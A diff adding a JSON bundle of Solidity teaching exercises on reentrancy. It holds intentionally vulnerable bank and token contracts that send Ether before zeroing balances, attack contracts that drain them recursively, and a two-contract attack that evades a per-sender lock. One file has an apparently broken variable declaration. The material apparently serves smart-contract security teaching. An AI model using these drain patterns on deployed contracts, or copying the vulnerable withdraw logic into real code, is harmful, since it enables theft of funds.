@@ -1,0 +1,45 @@
+{
+  "B5_Ex3_BankSafe.sol": {
+    "__sources__": {
+      "B5_Ex3_BankSafe.sol": {
+        "content": "pragma solidity ^0.8.15;\n\ncontract ReentrancyGuard {\n    bool private locked;\n\n    modifier noReentrant() {\n        require(!locked, \"No reentrancy\");\n        locked = true;\n        _;\n        locked = false;\n    }\n}\ncontract BankSafe {\n\n  mapping(address => uint256) public balances;\nbool private locked;\n\nmodifier noReentrant() {\n    require(!locked, \"No reentrancy\");\n    locked = true;\n    _;\n    locked = false;\n}\n  function deposit() public payable {\n    balances[msg.sender] += msg.value;}\n\n  function withdraw() public noReentrant{\n    require(balances[msg.sender] != 0);\n    (bool result, ) = msg.sender.call{value: balances[msg.sender]}(\"\");\n    balances[msg.sender] = 0; }}\n\ncontract AttackRE {\n\n    BankSafe public BankSafe;\n    uint256 public constant AMOUNT = 1 ether;\n\n    constructor(address _BankSafeAdress) {\n        BankSafe = BankSafe(_BankSafeAdress);\n    }\n\n    fallback() external payable {\n        if (address(BankSafe).balance >= AMOUNT) {\n            BankSafe.withdraw();\n        }\n    }\n    function attack() external payable {\n        require(msg.value >= AMOUNT);\n        BankSafe.deposit{value: AMOUNT}();\n        BankSafe.withdraw();\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}",
+        "file": "B5_Ex3_BankSafe.sol"
+      }
+    }
+  },
+  "B5_Ex4_Mint.sol": {
+    "__sources__": {}
+  },
+  "B5_Ex2_Attack.sol": {
+    "__sources__": {
+      "B5_Ex2_Attack.sol": {
+        "content": "pragma solidity ^0.8.15;\n\ncontract BankRE {\n  mapping(address => uint256) public balances;\n\n  function deposit() public payable {\n    balances[msg.sender] += msg.value;}\n\n  function withdraw() public {\n    require(balances[msg.sender] != 0);\n    (bool result, ) = msg.sender.call{value: balances[msg.sender]}(\"\");\n    balances[msg.sender] = 0; }}\n\ncontract AttackRE {\n\n    BankRE public bankRE;\n    uint256 public constant AMOUNT = 1 ether;\n\n    constructor(address _bankREAdress) {\n        bankRE = BankRE(_bankREAdress);\n    }\n\n    fallback() external payable {\n        if (address(bankRE).balance >= AMOUNT) {\n            bankRE.withdraw();\n        }\n    }\n    function attack() external payable {\n        require(msg.value >= AMOUNT);\n        bankRE.deposit{value: AMOUNT}();\n        bankRE.withdraw();\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}",
+        "file": "B5_Ex2_Attack.sol"
+      }
+    }
+  },
+  "B5_Ex3_Guard.sol": {
+    "__sources__": {
+      "B5_Ex3_Guard.sol": {
+        "content": "pragma solidity ^0.8.15;\n\ncontract ReentrancyGuard {\n    bool private locked;\n\n    modifier noReentrant() {\n        require(!locked, \"No reentrancy\");\n        locked = true;\n        _;\n        locked = false;\n    }\n}\ncontract BankSafe {\n\n  mapping(address => uint256) public balances;\nbool private locked;\n\nmodifier noReentrant() {\n    require(!locked, \"No reentrancy\");\n    locked = true;\n    _;\n    locked = false;\n}\n  function deposit() public payable {\n    balances[msg.sender] += msg.value;}\n\n  function withdraw() public noReentrant{\n    require(balances[msg.sender] != 0);\n   \n    (bool result, ) = msg.sender.call{value: balances[msg.sender]}(\"\");\n\n    balances[msg.sender] = 0; }\n    }\n\n\ncontract AttackRE {\n\n    BankSafe public bankSafe;\n    uint256 public constant AMOUNT = 1 ether;\n\n    constructor(address _bankSafeAdress) {\n        bankSafe = BankSafe(_bankSafeAdress);\n    }\n\n    fallback() external payable {\n        if (address(bankSafe).balance >= AMOUNT) {\n            bankSafe.withdraw();\n        }\n    }\n    function attack() external payable {\n        require(msg.value >= AMOUNT);\n        bankSafe.deposit{value: AMOUNT}();\n        bankSafe.withdraw();\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}",
+        "file": "B5_Ex3_Guard.sol"
+      }
+    }
+  },
+  "B5_Ex4_Evasion.sol": {
+    "__sources__": {
+      "B5_Ex4_Evasion.sol": {
+        "content": "contract TokenMint2Ether {\n  mapping(address => uint256) balance;\n  mapping(address => bool) lock;\n  mapping(address => mapping(address => uint256)) allowance;\n\nmodifier checkLock { // reentrancy locking\n  require(lock[msg.sender] == false); _; }\n\nfunction deposit() external payable {\n  balance[msg.sender] += msg.value;\n}\n\nfunction approve(address other, uint256 amnt) external { \n  allowance[msg.sender][other] += amnt; }\n\nfunction transferFrom(address from, uint256 amnt) external checkLock {\n  require(balance[from] >= amnt);\n  require(allowance[from][msg.sender] >= amnt);\n  balance[from] -= amnt;\n  allowance[from][msg.sender] -= amnt;\n  balance[msg.sender] += amnt; }\n\nfunction burn2Ether() external checkLock {\n  // set lock\n  lock[msg.sender] = true;\n  msg.sender.call{value: balance[msg.sender]}(\"\");\n  // release lock\n  lock[msg.sender] = false;\n  balance[msg.sender] = 0; }\n}\n\ncontract MainAttack {\n    TokenMint2Ether public tokenMint;\n    CavalryAttack public cavalry;\n    uint256 public constant AMOUNT = 1 ether;\n\n    constructor(address _tm) { tokenMint = TokenMint2Ether(_tm); }\n    function setCav(address _c) external { cavalry = CavalryAttack(_c); }\n\n    function attack() external payable {\n        require(msg.value >= AMOUNT);\n        tokenMint.deposit{value: AMOUNT}();\n        tokenMint.approve(address(cavalry), AMOUNT);   // let Cavalry pull Main's balance\n        tokenMint.burn2Ether();                        // lock[Main]=true; callback -> fallback\n    }\n\n    fallback() external payable {\n        // runs mid-burn2Ether, before balance[Main] is zeroed\n        cavalry.pull();                                // hand off to the UNLOCKED contract\n    }\n\n    function getBalance() public view returns (uint256) { return address(this).balance; }\n}\n\ncontract CavalryAttack {\n    TokenMint2Ether public tokenMint;\n    MainAttack public main;\n    uint256 public constant AMOUNT = 1 ether;\n\n    constructor(address _tm) { tokenMint = TokenMint2Ether(_tm); }\n    function setMain(address payable _m) external { main = MainAttack(_m); }\n\n    function pull() external {\n        // msg.sender = Cavalry (not locked); from = Main (balance still non-zero)\n        tokenMint.transferFrom(address(main), AMOUNT);\n    }\n\n    function getBalance() public view returns (uint256) { return address(this).balance; }\n}",
+        "file": "B5_Ex4_Evasion.sol"
+      }
+    }
+  },
+  "B5_Ex1_Fallback.sol": {
+    "__sources__": {
+      "B5_Ex1_Fallback.sol": {
+        "content": "pragma solidity ^0.8.15;\n\ncontract FallbackReceiver {\n  event Log(string func, uint gas);\n  fallback() external payable {\n    emit Log(\"fallback\", gasleft());}\n\n  function getBalance() public view returns (uint) {\n    return address(this).balance;}}\n\ncontract FallbackSender {\n  function call(address payable _to) public payable {\n    (bool sent, ) = _to.call{value: msg.value}(\"\");\n    require(sent, \"Failed to send Ether\");}}",
+        "file": "B5_Ex1_Fallback.sol"
+      }
+    }
+  }
+}
